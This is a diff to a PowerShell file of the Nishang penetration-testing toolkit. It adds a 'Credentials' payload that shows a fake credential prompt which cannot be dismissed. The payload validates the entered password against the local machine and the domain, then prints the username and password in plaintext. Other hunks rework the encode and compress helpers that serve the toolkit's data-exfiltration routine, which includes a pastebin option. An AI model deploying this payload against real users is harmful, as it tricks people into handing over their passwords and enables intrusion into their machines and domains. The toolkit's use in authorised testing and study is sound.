@@ -207,6 +207,60 @@ https://github.com/samratashok/nishang
     $output
 
 }
+
+#####################################Displays a credential prompt and doesn't go away till valid credentials are entered##################
+
+function Credentials
+{
+<#
+.SYNOPSIS
+Function which opens a user credential prompt.
+
+.DESCRIPTION
+This payload opens a prompt which asks for user credentials and
+does not go away till valid credentials are entered in the prompt.
+
+
+.EXAMPLE
+PS > Credentials
+
+.LINK
+http://labofapenetrationtester.blogspot.com/
+https://github.com/samratashok/nishang
+#>
+
+[CmdletBinding()]
+Param ()
+
+    $ErrorActionPreference="SilentlyContinue"
+    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
+    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
+    while($true)
+    {
+        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
+        if($credential)
+        {
+            $creds = $credential.GetNetworkCredential()
+            [String]$user = $creds.username
+            [String]$pass = $creds.password
+            [String]$domain = $creds.domain
+            $authlocal = $DS.ValidateCredentials($user, $pass)
+            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
+            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
+            {
+                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
+                $output
+                break
+            }
+        }
+    }
+}
+
+
+
+
+
 ####################################Silently removes updates for a target machine.########################################################
 ###Thanks Trevor Sullivan
 ###http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
@@ -3510,15 +3564,15 @@ https://github.com/samratashok/nishang
 
     function Compress-Encode
     {
-        #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
-        $encdata = [string]::Join("`n", $Data)
-        $ms = New-Object System.IO.MemoryStream
-        $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
-        $sw = New-Object System.IO.StreamWriter($cs)
-        $sw.Write($encdata)
-        $sw.Close();
+        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+        $ms = New-Object IO.MemoryStream
+        $action = [IO.Compression.CompressionMode]::Compress
+        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+        $Data | ForEach-Object {$sw.WriteLine($_)}
+        $sw.Close()
         $Compressed = [Convert]::ToBase64String($ms.ToArray())
-        $Compressed
+        return $Compressed
     }
 
     if ($exfiloption -eq "pastebin")
@@ -3584,7 +3638,6 @@ Functiob to encode and compress plain data.
 
 .DESCRIPTION
 The function asks for a path to a plain file, encodes it and writes to a file "encoded.txt" in the current working directory.
-Both the encoding and decoding is based on the code by ikarstein.
 
 .PARAMETER DataToEncode
 The path of the file to be decoded. Use with -IsString to enter a string.
@@ -3607,7 +3660,6 @@ PS > Invoke-Encode Get-Process -IsString
 Use above to decode a string.
 
 .LINK
-http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
 https://github.com/samratashok/nishang    
 #>    
     
@@ -3634,13 +3686,15 @@ https://github.com/samratashok/nishang
     {
         $Enc = Get-Content $DataToEncode -Encoding UTF8 
     }
-
-    $data = [string]::Join("`n", $Enc)
-    $ms = New-Object System.IO.MemoryStream
-    $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
-    $sw = New-Object System.IO.StreamWriter($cs)
-    $sw.Write($data)
-    $sw.Close();
+    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+    $ms = New-Object IO.MemoryStream
+    $action = [IO.Compression.CompressionMode]::Compress
+    $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+    $Enc | ForEach-Object {$sw.WriteLine($_)}
+    $sw.Close()
+    
+    # Base64 encode stream
     $Compressed = [Convert]::ToBase64String($ms.ToArray())
     $Compressed
     Out-File -InputObject $Compressed -FilePath .\encoded.txt
@@ -3656,7 +3710,7 @@ Function to decode the data encoded by Invoke-Encode, DNS TXT and POST exfiltrat
 
 .DESCRIPTION
 The function asks for an encoded string as an option, decodes it and writes to a file "decoded.txt" in the current working directory.
-Both the encoding and decoding is based on the code by ikarstein.
+
 
 .PARAMETER EncodedData
 The path of the file to be decoded. Use with -IsString to enter a string.
@@ -3679,7 +3733,6 @@ PS > Invoke-Decode K07MLUosSSzOyM+OycvMzsjM4eUCAA== -IsString
 Use above to decode a string.
 
 .LINK
-http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
 https://github.com/samratashok/nishang
 
 #>
@@ -3711,7 +3764,7 @@ https://github.com/samratashok/nishang
     $ms = New-Object System.IO.MemoryStream
     $ms.Write($dec, 0, $dec.Length)
     $ms.Seek(0,0) | Out-Null
-    $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+    $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
     $sr = New-Object System.IO.StreamReader($cs)
     $output = $sr.readtoend()
     $output
